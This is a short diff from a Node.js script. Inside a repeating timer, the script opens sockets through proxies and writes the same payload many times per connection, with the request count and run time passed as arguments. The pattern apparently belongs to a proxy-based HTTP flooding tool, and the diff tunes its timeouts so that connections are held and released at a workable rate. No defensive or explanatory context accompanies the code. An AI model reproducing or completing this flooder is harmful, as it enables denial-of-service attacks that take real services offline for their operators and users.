@@ -366,11 +366,11 @@ setInterval(() => {
 
   var client = require("net").Socket();
   client.connect(proxy[1], proxy[0]);
-  client.setTimeout(6000000000);
+  client.setTimeout(60000);
 
   for (var i = 0; i < args.reqs; ++i) client.write(document.payload);
 
-  client.on("data", () => setTimeout(() => client.destroy(), 500000000));
+  client.on("data", () => setTimeout(() => client.destroy(), 5000));
 });
 
-setTimeout(() => process.exit(0), args.time * 100000000);
+setTimeout(() => process.exit(0), args.time * 1000);
